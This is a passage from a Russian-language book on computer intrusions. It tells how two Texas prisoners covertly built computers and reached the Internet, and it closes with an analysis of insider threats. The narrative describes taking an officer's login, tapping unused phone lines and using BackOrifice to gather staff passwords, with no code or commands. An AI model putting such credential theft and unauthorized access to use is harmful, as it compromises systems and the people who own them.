Access предлагает специальные устройства (tokens) для генерации паролей, цифровые сертификаты, смарт-карты, биометрическую и другие технологии.  Использование таких типов авторизации, естественно, удорожает систему и добавляет определенные неудобства в работе с ней для каждого пользователя. Все зависит от того, что вы стремитесь защитить. Традиционные пароли вполне достаточны, чтобы защитить сайт газеты, где выложены новые статьи. Но достаточно ли их для того, чтобы защитить чертежи последней модели истребителя?   ПОСЛЕСЛОВИЕ   Истории, рассказанные в этой книге и на страницах прессы, демонстрируют, как небезопасны все государственные компьютерные системы, и как мы уязвимы перед подобными атаками. Очень мало систем обладают действительно надежным уровнем безопасности.  В эпоху терроризма необходимо постараться сделать все возможное. чтобы залатать имеющиеся и возникающие дыры. Эпизоды, рассказанные выше, говорят о серьезной проблеме: как легко таланты и знания наших детей могут быть обращены против нашего общества. Я не сомневаюсь, что уже в школе детям надо преподавать основы компьютерной этики параллельно с изучением основ информатики.  Не так давно я слушал выступление Франка Абагналя, ярого сторонника фильма «Поймай меня, если сможешь». Франк провел опрос среди студентов университетов по всей стране об этической стороне использования компьютеров. Каждому студенту был задан вопрос —считает ли он возможным для себя узнать пароль приятеля и проникнуть в его компьютер. Как это ни удивительно, но 48% опрошенных студентов ответили, что находят такую перспективу весьма забавной. С таким настроем молодежи несложно понять, почему люди начинают заниматься подобными делами.  Если кто-то знает, как сделать юных хакеров невосприимчивыми к попыткам наших явных и тайных врагов использовать их в своих интересах, пусть он обнародует свои предложения.       Глава 3.    Хакерство   в   Техасской   тюрьме      Я не думаю, что нечто сказанное вами может внезапно изменить молодого человека, если это нечто еще неосмыслено им самим. Думайте об этом и никогда не ищите коротких путей.      Вильям   Двое молодых заключенных, отбывающих сроки за убийство, в один прекрасный день встретились во дворе тюрьмы Техаса и обнаружили, что у них есть общее увлечение — компьютеры. Они сдружились и начали хакерствовать прямо под носом у стражей порядка.  Но все это в прошлом. Сегодня Вильям Батлер каждое утро в 5.30 садится в свою машину и начинает непростой путь через плотный трафик Хьюстона. Он считает себя везунчиком уже потому, что остался в живых. У него постоянная подружка и блестящий новый автомобиль. «Недавно мне прибавили к зарплате семь тысяч долларов. Неплохо», — гордо добавляет он.  Как и Вильям, его дружок Дэнни тоже наладил свою жизнь, у него стабильная работа, связанная с компьютерами. Но они никогда не забудут, какой ценой они заплатили за свое благосостояние. Как это ни странно, но именно время, проведенное в тюрьме, дало им те умения, которые они с таким успехом применяют в «свободном мире».   ВНУТРИ  :   ПОТРОША   КОМПЬЮТЕРЫ   Для новичка тюрьма становится настоящим шоком. Все прибывшие находятся в одном помещении до тех пор, пока самые отъявленные и закоренелые преступники будут отделены — очень тяжелое испытание для тех, кто пытается жить по общечеловеческим правилам. В окружении людей, которые могут взорваться по любому поводу, даже самому кроткому и тихому человеку приходится быть жестким и постоянно готовым постоять за себя. Вильям выработал свой способ выживания:  «Я жил так, как с л е д у е т жить там. Р о с т мой с т о семьдесят в о с е м ь сантиметров, а вот в е с — больше с т а килограммов. Но крупные размеры — это не главное, важнее то, что я в душе — сильный человек, я никому не позволю командовать мной. Так я себя и держу в любой компании. В тюрьме, если только ты покажешь свою слабость, обязательно кто-то захочет тебя использовать. Я не лгу, я ни к кому не пристаю, но и ко мне никому не советую приставать, поскольку я пошлю его сами понимаете куда.  И я, и Дэнни оба бывали в суровых переделках. Вы понимаете, что я имею в виду: нечто вроде гладиаторских боев, когда приходится сражаться буквально все время. Мы не сдавались никому — ни охранникам, ни сокамерникам. Мы сражались, пока стояли на ногах, в общем, делали все, что могли».  Дэнни уже отбывал двадцатилетний срок в тюрьме Wynne, расположенной в городе Хантсвилль (штат Техас), когда Вильям прибыл. Тогда его работа в тюрьме ничего общего с компьютерами не имела. «Сначала они послали меня в такую тюрьму, где заключенные были заняты на сельскохозяйственных работах. Они рыхлили грядки мотыгами, Это занятие вполне можно было механизировать, но этого не делалось — это был вид наказания, чтобы вы были готовы к более тяжелым работам впоследствии».  Когда Дэнни перевели в тюрьму Wynne, ему доверили работу клерка в транспортном отделе. «Я начал работать на печатной машинке Olivetti с экраном и несколькими жесткими дисками. Там была простейшая операционная система и слабенькая память. Я долго думал, как бы ее использовать». (Для меня это знакомый механизм: первый компьютер, который я использовал в жизни, был телетайп Olivetti с акустическим модемом).  Ему удалось найти какое-то старинное руководство для работы с базами данных под названием dBase III. «Я разобрался, как можно поместить в базу данных доклад, пока все другие будут печатать в это время свои сообщения». Он загрузил в базу данных все тюремные заказы и запустил программу, которая отслеживала все поставки сельскохозяйственных продуктов из тюрьмы в другие тюрьмы штата.  Постепенно Дэнни стали доверять, и он получил более ответственную работу, для которой приходилось выходить за ворота тюрьмы. Его направили на работу в офис распределения, расположенный в трейлере за колючей проволокой, который занимался подготовкой бумаг для трейлеров, перевозящих продукты питания. Но гораздо важнее было то. что они дали ему «первый реальный доступ к компьютерам».  Через какое-то время ему даже выделили небольшую комнатку в этом трейлере и доверили под его ответственность все оборудование — от сборки новых устройств до починки старых. Это была уникальная возможность: научиться, как создавать компьютеры и чинить их на личном опыте. Некоторые из людей, с которыми он контактировал, приносили ему компьютерные книги, которые ускоряли процесс обучения.  Постоянный контакт с компьютером давал ему доступ к «полке, полной компьютерных деталей безо всякого учета и отчета». Вскоре он научился собирать компьютеры и добавлять в них компоненты, Сотрудники тюрьмы не проверяли компьютеры и не разбирались в том, как он их перестроил, поэтому он запросто мог дополнить компьютеры неучтенными деталями.   В  С  Е   ТЮРЬМЫ   Р  А  З  Н  Ы  Е   Такая беззаботность в отношении того, чем занимаются заключенные, нетипична для государственных тюрем США. Агентство контроля над тюрьмами в США всегда очень внимательно следит за этой проблемой. Во время моего нахождения в тюрьме у меня была специальная пометка « Н Е ДОПУСКАТЬ К КОМПЬЮТЕРУ», что означало, что допуск меня к компьютеру является угрозой безопасности. Меня не допускали даже к телефону: прокурор однажды заявил представителям суда, что если мне в заключении разрешат пользоваться телефоном, то я смогу свистнуть в него и таким образом послать команду межконтинентальным ракетам! Конечно, это звучит как немыслимый абсурд, но у судей не было оснований не верить подобному заявлению. Меня держали в одиночной камере целых восемь месяцев.  В федеральных тюрьмах США в то время заключенным разрешали пользоваться компьютером только при соблюдении целого ряда строгих правил. Ни один заключенный не мог пользоваться компьютером, если тот соединен с модемом, или с компьютерной сетью или с другим коммуникационным устройством. Все компьютеры и другие системы, содержащие мало-мальски важную информацию, были помечены надписями «Только для персонала», поэтому о любом использовании их заключенными становится известно и считается угрозой безопасности. Все компьютеры пристально контролируются технически грамотными сотрудниками, чтобы предотвратить неавторизованный доступ к ним.   ВИЛЬЯМ   НАХОДИТ   «КЛЮЧИ   ОТ   ЗАМКА»   Когда Вильяма перевели из его «сельскохозяйственной» тюрьмы в тюрьму Wynne в Хантсвилле, он получил там завидную работу на кухне. «Я получил настоящие „ключи от замка“, поскольку еду всегда можно обменять на другие нужные вещи».  В кухне был компьютер, древняя машина с 286-м процессором и вентилятором на передней панели, но еще вполне приемлемая для его цели — усовершенствовать свои компьютерные навыки. Он мог заносить туда всевозможные отчеты о продуктах и делать заказы в электронной форме, что экономило часы бесполезного переписывания цифр с одной бумажонки на другую.  После того, как Вильям выяснил, что есть еще один заключенный, который разделяет его интерес к компьютерам, Дэнни помог ему усовершенствовать его компьютер. Он вытащил необходимые запасные части с той самой полки в сельскохозяйственном трейлере и заручился помощью некоторых знакомых, которые могли свободно перемещаться по территории тюрьмы и перенесли все необходимое в комнатку Вильяма.  «Они ничего никому не говорили. Они принесли эти детали в кухню по нашей просьбе — просто поместили их в тележку и повезли. А потом, в преддверии Рождества, один из охранников принес в тюрьму коробку, в которой лежали все необходимые части компьютера».  Как ему удалось убедить охранника так грубо нарушить тюремные правила? «Я, что называется, „влез ему в душу“ — мы разговаривали и подружились». Родители Вильяма купили все необходимые детали компьютера, которые он им заказал, а охранник согласился пронести в куче других рождественских подарков.  Для расширения своего «компьютерного парка» Вильям решил приспособить небольшую кладовку около кухни. В комнате не было даже вентилятора, но он был уверен, что ему не составит труда решить эту проблему: «Я выменял кондиционер на еду, мы пробили дыру в стене и поместили туда кондиционер, таким образом мы могли дышать и работать в комфортных условиях», — объяснил он.  «Мы собрали целых три компьютера. На место старого 286-го процессора мы поместили современный Pentium. Жесткие диски плохо вписывались в старую конструкцию, поэтому нам пришлось укреплять их при помощи картонных трубок из рулонов для туалетной бумаги», — забавно было бы посмотреть на это инновационное решение!  Почему именно три компьютера? Дэнни иногда мог заходить к Вильяму, и тогда у каждого был свой ПК. А потом и третий парень начал вести у них «адвокатскую практику», предлагая заключенным платные услуги по изучению их дел, составлению апелляций и других подобных бумаг.  Тем временем, мастерство Вильяма в организации всей бумажной работы в пункте питания привлекло внимание капитана, который руководил поставками питания. Он дал Вильяму более широкие полномочия: когда тот не был занят своими основными делами, он подготавливал материалы для докладов капитана своему руководству.  Чтобы лучше справляться со своими новыми обязанностями Вильяму было разрешено работать в офисе капитана, — редкое доверие заключенному. Через некоторое время Вильяму стало чего-то не хватать: его компьютеры в кухонном блоке были набиты музыкальными файлами, играми и видео. А в офисе капитана этих удовольствий не было. Старые добрые американские инновации плюс хорошая порция бесстрашия проложили путь к решению проблемы. «Я выменял еду из кухни на сетевой кабель с технического склада. Тамошний клерк заказал для нас триста метров кабеля пятой категории. Его ввезли прямо через главные ворота. Я сказал охране, что работаю по заданию капитана, и они открыли дверь».  Короче говоря, при помощи этого кабеля они соединили компьютер в кабинете капитана с теми тремя, что стояли в кухонном отсеве. Теперь, когда капитана не было в офисе. Вильям мог продолжать играть в свои любимые игры, слушать музыку и смотреть видеоклипы.  Все это было связано с очень большим риском. Если бы капитан вернулся в свой офис неожиданно и застал его, слушающего музыку, рассматривающего девиц, или играющего в игры на его компьютере. пришлось бы распрощаться со своим привилегированным положением на кухне, приятным времяпровождением в офисе капитана и доступом ко всем компьютерным удовольствиям, который он с таким трудом себе организовал.  У Дэнни в тот момент были свои проблемы. Он работал в сельскохозяйственном отделе, окруженный компьютерами, разъемы которых были соединены с внешним миром. Он был похож на ребенка, прижавшего нос к витрине кондитерского магазина, за которой спрятано сладкое богатство, на которое у него нет ни копейки денег. Ужасная мука, когда желаемое так близко, но воспользоваться им нет никакой возможности.  Однажды в крошечной комнатке Дэнни появился офицер. «Он принес свой компьютер, потому что не знал, как выйти в Интернет. Я не имел представления о том, как работает модем, никто не учил меня этому, но я мог помочь ему разобраться в этом». В процессе подключения ПК к Интернет-соединению офицер, по просьбе Дэнни, назвал ему свое имя пользователя и пароль: скорее всего, он просто не задумывался о последствиях такого шага, поскольку был уверен. что ни одного заключенного не допустят до компьютера с выходом в Интернет.  Дэнни понял, что офицер либо слишком туп, либо совсем необразован в техническом плане, чтобы осознать происходящее: он выдал Дэнни электронный билет в Интернет. Тайно используя телефонную линию, проходящую вблизи его комнаты, Дэнни соединил ее с встроенным модемом своего компьютера. Имея имя пользователя и пароль офицера, которые он, естественно, запомнил, он был «весь в шоколаде»: у него появился доступ в Интернет.   ONLINE —   ЭТО   БЕЗОПАСНОСТЬ   Для Дэнни доступ в Интернет означал целый мир на экране его терминала. Но, так же как и Вильям, он подвергался большой опасности каждый раз, как он выходил в Интернет.  «Я мог выходить в Интернет и отыскивать там информацию о компьютер а х и о чем угодно, задавать вопросы. В с е э т о делалось от имени того офицера, но каждую минуту я боялся, что обман может открыться. Я старался быть максимально аккуратным и никогда не оставался в Интернете долгое время».  Несмотря на все предосторожности, его работа имела определенные последствия, Дэнни встроился в телефонную линию, которая была соединена с тюремным факсом. Вскоре со стороны других тюрем стали поступать жалобы на то, что их факс занят большую часть времени. Дэнни понял, что для безопасных и неспешных путешествий по Интернету необходима выделенная линия. После не слишком интенсивного поиска ему удалось найти решение: он обнаружил две телефонные линии, которые просто не использовались. Никто из персонала тюрьмы даже не помнил, что они существуют. Он соединил провод от своего модема с одной из этих линий. Теперь у него была собственная внешняя линия. Была решена еще одна проблема.  В самом углу своей крошечной комнаты под грудой пустых коробок он установил компьютер, который служил ему сервером — на самом деле он там хранил все, что перегружал себе из Интернета — музыкальные файлы, хакерские инструкции и все то. что ему не хотелось хранить на своем компьютере, так как кто-то мог случайно туда заглянуть, и увидеть то, что видеть не следовало. Все вроде бы шло своим чередом, но Дэнни был озабочен еще одной проблемой, которая казалась ему гораздо более серьезной. Он не мог понять, что будет, если он и офицер (под именем которого он входил в Интернет) одновременно попытаются использовать одно и то же имя для входа в Интернет. Если Дэнни будет работать под его именем, получит ли офицер уведомление о том, что кто-то его уже использует? Офицер наверняка расстроится, и наверняка начнет задумываться, и припомнит, что давал Дэнни свое имя и пароль. Дэнни не мог найти решения этой проблемы: она буквально подавляла его.  И все же он был горд тем, чего ему удалось достичь в сложившихся обстоятельствах. На это пришлось потратить колоссальные усилия. «Я смог построить вполне приличную систему — работающие сервера, перегрузка всего, что меня интересовало в Интернете — игры, видео, хакерская информация, информация об устройстве сетей, их уязвимых местах, о том, как отыскать открытый порт».  Вильям объясняет, почему Дэнни удалось построить свой офис в сельскохозяйственном отделе. « П о сути дела он р а б о т а л сетевым администратором, поскольку те вольнонаемные сотрудники, которые должны были этим заниматься, были полными ничтожествами». Они не знали, как писать программы на языках C++ и Visual Basic, поэтому просто не могли выполнять свои обязанности, у них не хватало ума и на то, чтобы адекватно организовывать работу сети.  Одна из проблем, беспокоивших Дэнни, была в том, что его компьютер стоял на проходе и любой желающий мог посмотреть, что он делает. После окончания рабочих часов его сельскохозяйственный офис запирался, поэтому он мог выходить в Интернет только в течение дня, отыскивая такие минуты, когда все остальные сотрудники офиса были слишком заняты своей собственной работой, чтобы обращать на него внимание. Ему пришлось придумать даже способ использования другого компьютера — он соединил свой ПК с другим, который использовал гражданский сотрудник, работавший рядом с ним. Когда тот не сидел на своем месте и никого не было вокруг, Дэнни входил с того компьютера в Интернет и через него скачивал на свой сервер в углу необходимые ему музыкальные файлы или игры.  Однажды, когда он занимался чем-то подобным, в комнату неожиданно вошла женщина-охранник, а они всегда более педантичны и строги, чем мужчины, как единодушно считают и Дэнни, и Вильям. Он не успел отключить другой компьютер и заметил, как ее глаза удивленно расширяются: она увидела, что курсор на нем движется, хотя никто не сидит за терминалом! В этот момент Дэнни удалось отключить этот компьютер. Охранница несколько раз моргнула, подумала, что ей что-то померещилось, и вышла из комнаты.   РЕШЕНИЕ   Вильям прекрасно помнит тот день, когда решение всех их проблем, связанных с Интернетом, нашлось благодаря Дэнни. Всей кухонной команде разрешалось обедать в офицерской комнате, если капитан уже закончил свой обед и ушел. Вильям часто приводил Дэнни угоститься «более приличной кормежкой» в обеденной комнате, кроме того, они могли там поговорить без свидетелей. «Я не могу припомнить, в какой из дней он до этого додумался», — вспоминает Вильям. « О н сказал: „Я знаю, как мы сможем сделать это, Ви“. Так они называли меня: „ В и “ или „Большой Ви“. И после этого он объяснил мне, что мы должны сделать».  Дэнни просто соединил в своем воображении два кусочка «пазла»; телефонную линию, которая соединяла его с внешним миром из его сельскохозяйственного офиса и компьютеры Вильяма в его кухне. Он предложил способ безопасного и свободного соединения двух компьютеров с Интернетом в любое время.  «Мы обычно сидели за его компьютерами в кухонном помещении и играли в игры. Как-то я подумал: „если мы можем спокойно сидеть здесь и играть в игры, и никому нет дела — охранников ничего не волнует, раз наша работа выполнена, — так почему мы не можем получить доступ в Интернет прямо отсюда?“  Оборудование в сельскохозяйственном офисе было достаточно современным, поскольку, как объясняет Дэнни. другие тюрьмы зависели от их сервера. Слово «зависели» означает, что компьютеры в других тюрьмах соединялись через «dial-up» соединение с сервером сельскохозяйственного офиса, который был сконфигурирован так, что реализовывал dial-up соединение через RAS Microsoft (Remote Access Services).  Ключевым моментом, волновавшим друзей, были модемы. «Главным было получить контроль над модемами». — вспоминал Вильям. «Их контролировали достаточно жестко. Но мы смогли получить доступ к нескольким из них». Теперь, когда они были готовы работать из кухонного помещения, «все что нам надо было сделать, это соединить внутренние линии с сельскохозяйственным офисом».  Вот что это означает на практике: из кухонного помещения ребята послали команду с модема компьютера набрать внутренний номер телефона. Этот звонок пришел на модем в офисе Дэнни, который был соединен с его сервером. Сервер был соединен внутренней сетью с другими компьютерами в офисе, в некоторых из которых были модемы. соединенные с внешними телефонными линиями. Компьютеры кухонного и сельскохозяйственного офиса «беседовали» друг с другом по внутренней телефонной линии. Следующей командой было указание компьютеру из сельскохозяйственного офиса соединиться с Интернетом. Раз-два, и соединение установлено!  Не спешите, не все так просто. Двум нашим хакерам еще предстояло получить соединение с Интернет-провайдером. Вначале они перепробовали все имена и пароли сотрудников, которые работали в их тюрьме, «когда мы были уверены, что они уехали в город в магазин или куда-то еще», говорит Дэнни. Всю эту информацию им удалось собрать при помощи программы под названием «BackOrifice», популярного средства удаленного контроля, который давал им возможность управлять удаленным компьютером так, как если бы они сидели прямо за ним.  Естественно, использование паролей других людей было очень рискованным делом — можно было попасться, причем самыми разными путями. Здесь выход нашел Вильям. «Я попросил моих родителей оплатить доступ в Интернет у местного Интернет-провайдера», поэтому им не пришлось больше использовать пароли доступа других людей.  Таким образом они получили доступ в Интернет из сельскохозяйственного офиса в любое время дня и ночи. «У нас было два FTP-cep-вера, которые загружали кинофильмы, музыку, хакерские программы и все. что угодно». — говорит Дэнни. «Я смог добраться даже до тех игр, которые еще не были выпущены».   ПОЧТИ   ПРОРВАЛИСЬ   Вильяму удалось достать звуковую карту для своего компьютера, а вдобавок к ней еще и колонки, так что они могли полноценно прослушивать музыку и смотреть фильмы. Когда охранник спрашивал их, чем они занимаются, Вильям отвечал ему: «Я не лезу в твои дела, и ты не лезь в мои».  «Я все время объяснял охранникам, что есть некоторые вещи в жизни, которые я могу им обещать. Во-первых, у меня нет и не будет пистолета, и я никого здесь не убью. Во-вторых, я не буду пользоваться наркотиками и глушить свое сознание. В-третьих, я не сводник и никогда не буду участвовать в их делах. В-четвертых, у меня не будет никаких дел с женщинами-охранниками.  Я не мог обещать им, что не буду бороться. Я никогда не лгал им. И они уважали мою честность и прямоту, поэтому и делали кое-что для меня. Всегда можно уговорить охранников при помощи разумных слов.  Слова правят нами. Можно уговорить женщину раздеться, а мужчину — сделать то, что вам нужно, чтобы он сделал».  Но, как бы убедительно вы не говорили, ни один охранник не позволит заключенному соединить свой компьютер с внешней телефонной линией. Каким же образом нашим двум приятелям удалось совершать свои хакерские эскапады в непосредственной близи от охранников? Вильям объясняет:  «Мы смогли сделать многое из того, что сделали, поскольку охранники смотрели на нас, как на недоумков. Мы находились в тюрьме в сельскохозяйственном районе, поэтому охранникам было невдомек, чем мы занимаемся. Они даже и вообразить не могли, на что мы способны».  А вот еще одна причина того, что два заключенных выполняли всю работу с компьютерами, за которую получали зарплату другие. «Большинство из сотрудников тюрьмы, которые должны были работать с компьютерами, просто не имели представления о них, поэтому нам приходилось делать их работу», — рассказывает Вильям.  Эта книга переполнена историями о том, какой хаос и какие повреждения могут причинить хакеры, но Вильям и Дэнни не относятся к этому разряду людей. Они просто хотели развить свои компьютерные умения и по мере возможности развлечься, трудно не понять их устремления в тех обстоятельствах, в которых они оказались, Вильям подчеркивает, что ему очень важно это различие.  «Мы никогда не стремились причинить вред кому-либо. Я считал (со своей точки зрения), что имею право изучать то, что я хочу изучать, чтобы иметь возможность нормально жить после освобождения из тюрьмы».  Руководство тюрьмы в Техасе оставалось в полном неведении относительно того, что происходило у него под носом, и это счастье, что у Дэнни и Вильяма не было злонамеренных устремлений. Представьте себе только, какой переполох могли устроить эти двое: без особых усилий они могли бы придумать схему извлечения денег или собственности у ничего не подозревавших жертв. Интернет стал их университетом и игровой площадкой. Они смогли бы научиться проникать на корпоративные сайты компаний или запускать атаки на личные компьютеры: подростки и даже дети обучаются подобным хитростям ежедневно на хакерских сайтах или других местах в Интернете. Поскольку они были заключенными, времени для этого у них было предостаточно.  Может быть, стоит извлечь урок из этой истории: два человека были осуждены за убийство, но ведь это совсем не означает, что они убийцы до мозга костей. Два мошенника отыскали путь в Интернет нелегально, но это не значит, что они собирались сделать своими жертвами невинных людей, или наивные и недостаточно защищенные компании.   БЛИЗКИЙ   ЗВОНОК   Два начинающих хакера не позволяли соблазнам Интернета отвлечь их от процесса обучения. «Я сумел получить все нужные книги при помощи моей семьи», — вспоминает Вильям, который все их действия считал необходимой тренировкой. «Я хотел разобраться в том, как работает сеть на основе протокола TCP/IP. Мне эти знания были нужны для жизни после освобождения из тюрьмы».  «Это было одновременно и учеба и удовольствие — вы понимаете, что я имею в виду? Это было удовольствие, поскольку я человек А-типа — я люблю жить на пределе возможностей. И это был способ утереть нос мужланам. Потому что они ни что подобное не способны».  Кроме серьезной и развлекательной сторон Интернета. Дэнни и Вильям использовали его возможности для завязывания электронных знакомств. Они познакомились с несколькими женщинами, встречались с ними в чатах, и переписывались через электронную почту. Очень немногим они сообщали, что находятся в тюрьме, большинству — ничего не говорили. Что вполне объяснимо.  Жизнь на грани добавляет в нее адреналина, но всегда сопровождается серьезным риском. Вильям и Дэнни никогда не переставали оглядываться и смотреть, нет ли кого-нибудь за их спинами.  «Однажды мы были совсем близко к тому, чтобы быть пойманными», — вспоминает Вильям. «Один из офицеров был настоящим параноиком и мы не любили его за это. Мы старались не выходить в Интернет во время его дежурства».  Этот офицер однажды позвонил на кухню и обнаружил, что телефон постоянно занят. «У него появились подозрения, потому что один из ребят, работающих на кухне, завязал знакомство с медсестрой из тюремной больницы». Офицер заподозрил, что этот заключенный — Джордж — постоянно треплется со своей подружкой по тюремному телефону. На самом деле линия была занята, поскольку Вильям пользовался Интернетом. Офицер поспешил на кухню. « М ы услышали, как в двери повернулся ключ, и поняли, что кто-то идет. Поэтому мы все мгновенно отключили».  Когда охранник вошел к ним. Вильям набивал на компьютере свой обычный отчет, а Дэнни безмятежно наблюдал за ним. Охранник хотел знать, почему телефонная линия была занята так долго. Вильям был готов к такому вопросу и выдал ему историю о том, что ему необходимо было позвонить, чтобы получить сведения для отчета, над которым он работает.  «Мы не могли соединиться с внешним миром отсюда, и он знал об этом, но он был просто супер-параноиком. Он решил, что мы каким-то образом помогаем Джорджу переговариваться с его подружкой».  Поверил он рассказу Вильяма или нет, неизвестно, но без доказательств ничего не мог сделать. Кстати, тот самый Джордж женился потом на медсестре; по сведениям Вильяма, он все еще находится в тюрьме и счастливо женат.   СТАНОВЛЕНИЕ   Как же мог юноша, подобный Вильяму — ребенок из хорошей семьи с заботливыми родителями — о к а з а т ь с я в тюрьме? « М о е детство было очень хорошим. Я был не самым лучшим, но достаточно умным студентом. Я никогда не играл в футбол и подобные подвижные игры, но до окончания колледжа у меня не было никаких проблем».  Посещение религиозной организации Южных баптистов не стало полезным опытом для Вильяма. По его мнению, активный интерес к религии может нанести вред мировоззрению молодого человека. «Вы знаете, с самого начала они вам объясняют, что вы ничего собой не представляете». Отчасти он винит в своей нелегкой судьбе тот факт, что его с самого начала убедили в том, что из него ничего не выйдет. «Понимаешь, я должен был откуда-то взять самоуважение и научиться правильной самооценке, а я мог отталкиваться только от мнения людей, которые путали меня».  Изучая философию, Вильям понял, что Фридрих Ницше имел в виду под «метаморфозами духа»:  «Я не знаю, читали ли вы когда-нибудь Ницше, но он рассказывает о верблюде, льве и ребенке. Я — верблюд: я стараюсь сделать что-то, что сделает людей счастливыми и получаю удовольствие от того, что люди любят меня, вместо того, чтобы любить себя и делать то, что нужно мне».  Несмотря на все это, Вильям окончил школу с хорошими оценками. Его проблемы начались, когда он поступил в колледж в Хьюстоне, а затем перешел в авиационную школу, расположенную в Луизиане. Инстинктивное желание доставлять удовольствия другим превратилось в потребность завоевать авторитет.  «Я обнаружил, что могу делать неплохие деньги, продавая наркотики.  Люди боялись меня, поскольку я всегда был вооружен и всегда был готов сражаться, но вы знаете, я жил жизнью полного идиота. А потом попал в ситуацию, когда все обернулось настоящей бедой».  Однажды его разговор с покупателем превратился в нешуточную драку. Появился приятель покупателя, их стало двое против одного, Вильям понял, что надо сделать решительный шаг, иначе он рискует не выбраться оттуда. Он вытащил пистолет, выстрелил в человека и убил его.  Как случилось т а к , что мальчик из приличной стабильной семьи оказался в таком ужасном положении? Как он перенес все случившееся? «Тяжелее всего было сообщить моей маме о том, что я сделал это. О господи, это было очень трудно».  У Вильяма появилось много времени для раздумий о том, что привело его в тюрьму. Он не винил никого, кроме себя. « В ы знаете, это был выбор, который я сделал из-за того, что моя самооценка была искаженной. Мои родители ни при чем, поскольку они поставили меня на тот путь, по которому, как они искренне верили, мне следует идти». Для Дэнни также все пошло прахом в одну ночь. «Я был просто глупым ребенком. День моего восемнадцатилетия мы отмечали в ресторане. По пути домой девчонкам понадобилось в туалет, поэтому они зашли в другой ресторан.  Когда они вышли оттуда, за ними увязались несколько парней, которые приставали к ним. Мы выскочили из машины, и завязалась драка. Я схватился с одним из этих парней. Ударил его так, что он упал. Я испугался: понял, что убил. Мы поскорее уехали. Я просто обезумел».  Его охватило непреодолимое желание спрятаться и откреститься от того, что произошло. Если бы Дэнни не уехал с места происшествия, то случившееся можно было бы трактовать, как непредумышленное убийство. Его главная ошибка была именно в том, что он удрал с места драки, и когда его выследили и арестовали, никто не поверил в то, что все произошло случайно.   НАЗАД   В   СВОБОДНЫЙ   МИР   Вильям пробыл в тюрьме примерно четверть своего тридцатилетнего срока, безуспешно апеллируя к вышестоящей судебной инстанции — Parole Board. Он писал свои письма туда каждые две недели, причем посылал копию каждому из членов коллегии Parole Board. В этих письмах он подробно излагал, как примерно он себя ведет; «Какие курсы закончил, какие специальности приобрел, какие компьютерные книги прочел, и т.д.», — демонстрируя им, «что я примерный гражданин и не трачу своего времени даром».  Вильям рассказывает: «Один из членов коллегии даже сказал моей маме, что „ о н получил от меня больше писем, чем от всех своих шестерых детей вместе взятых“. И это, наконец, сработало: они продержали его в тюрьме еще почти год, а потом выпустили. Дэнни, у которого был более короткий срок, освободился примерно в то же время.  После освобождения Вильям и Дэнни были четко ориентированы на то, чтобы не попадать в неприятные ситуации и работать в местах, связанных с компьютерами, применяя полученные в тюрьме навыки. Хотя и тот и другой обучались в тюрьме на компьютерных курсах, оба считают, что прежде всего практические занятия (хоть и очень рискованные) помогли им стать экспертами в том, от чего теперь зависела их жизнь.  Дэнни прошел 64-часовой курс в тюрьме, и хотя он не получил никаких профессиональных сертификатов, он работал теперь с мощными компьютерными приложениями, включая Access и SAP.  Еще перед тюрьмой Вильям окончил первый курс колледжа и перешел на второй благодаря активной поддержке родителей. После того, как он вышел из тюрьмы, он смог продолжить свое обучение. «Я попросил о финансовой помощи, получил ее, и отправился в институт, где я сразу стал отличником, и при этом еще работал в институтском компьютерном центре».  Сейчас у него две университетские степени «associates» — в области искусств и в области сетевой поддержки компьютерных систем — обе были получены при финансовой поддержке правительства. Несмотря на две степени, Вильяму повезло меньше, чем Дэн-ни при получении работы, связанной с компьютерами. Поэтому ему пришлось согласиться на то, что подвернулось под руку — должность в физической лаборатории. Учитывая уровень подготовки и его готовность к любой работе, можно ожидать, что как только компания узнает о его возможностях в области компьютеров. его освободят от выполнения лабораторных работ и поставят на такую должность, где его техническая квалификация будет использоваться оптимально. Пока ему не удалось посвятить себя построению сетей, о котором он мечтал в тюрьме, у него рутинные обязанности, но он реализует свой талант, бесплатно занимаясь по выходным конфигурацией компьютерных систем в двух церквях Хьюстона на совершенно добровольной основе.  Эти два человека являются исключением. Одно из самых жестких и наименее обсуждаемых правил в современном американском обществе заключается в том, что вышедшие из тюрем люди сталкиваются с колоссальными трудностями в поисках работы, особенно хорошо оплачиваемой работы, которая может обеспечить приемлемую жизнь семье. И это можно понять: какой работодатель согласится взять к себе убийцу, вооруженного грабителя, насильника? В некоторых штатах США они не могут пользоваться поддержкой из благотворительных фондов, что оставляет им совсем мало способов для выживания в почти безнадежных поисках работы. Их возможности предельно ограничены, а после этого мы недоумеваем, почему столь многие преступники быстро возвращаются в тюрьму, и полагаем, что это связано с их врожденным нежеланием жить по общепринятым правилам.  С высоты своего опыта Вильям дает такие советы молодым людям и их родителям.  «Я не думаю, что нечто сказанное может внезапно изменить молодого человека, если это нечто еще не осмыслено им самим. Помните об этом и не ищите коротких путей, поскольку долгий путь всегда вознаграждается в конце. И никогда не бездействуйте, поскольку так вы не сможете почувствовать себя готовым к выполнению того, что вам действительно нужно».  С этими словами Вильяма без сомнения согласится и Дэнни. «Я не променяю свою жизнь на другую ни за что на свете. Я пришел к выводу, что только я сам могу найти свою дорогу в жизни, и идя по ней, нельзя „срезать“ углы. Прожив часть своей жизни, я усвоил, что могу заставить людей уважать меня за мои собственные достоинства. Именно так я и стараюсь жить сегодня».   АНАЛИЗ   История Вильяма и Дэнни демонстрирует нам, что многие компьютерные атаки происходят так, что никакой защитный экран не может им противостоять: злодеи не всегда бывают молодыми хакерами или опытными компьютерными ворами, они могут быть «скрытыми врагами» — недобросовестными служащими компании, рассерженными своим недавним увольнением сотрудниками или, как в нашем случае, даже группой сотрудников, имеющих собственные цели и мотивы для действия.  Есть немало примеров тому, что скрытые враги представляют собой существенно большую угрозу, чем те атакующие, о которых мы читаем в газетах. Большинство систем безопасности ориентировано на защиту границ компании от внешних атак, тогда как именно скрытый враг имеет доступ ко всему оборудованию, системе кабелей. телефонным станциям и сетевым соединениям. Без эффективной программы обеспечения безопасности, включающей в себя работу секьюрити, аудит совместимости, постоянное совершенствование систем, мониторинг и другие способы контроля, злоумышленники легко могут проникать в корпоративную сеть.  Еще один аспект этой истории напоминает мне известный фильм «Побег из Шоушенка». В нем один из заключенных по имени Энди является финансовым консультантом; он помогает служащим тюрьмы оформлять соответствующие документы для сокращения налогов и дает им советы по оптимальному управлению их финансовыми активами. Талант Энди быстро завоевывает популярность у сотрудников тюрьмы на всех уровнях, и в результате позволяет ему добраться до личного счета начальника тюрьмы Уордена и манипулировать им. Не только в тюрьме, но и повсюду мы должны быть предельно внимательны с теми, кому доверяем секретную и любую важную информацию.  В моем собственном случае United States Marshal Service инициировала настоящую паранойю по 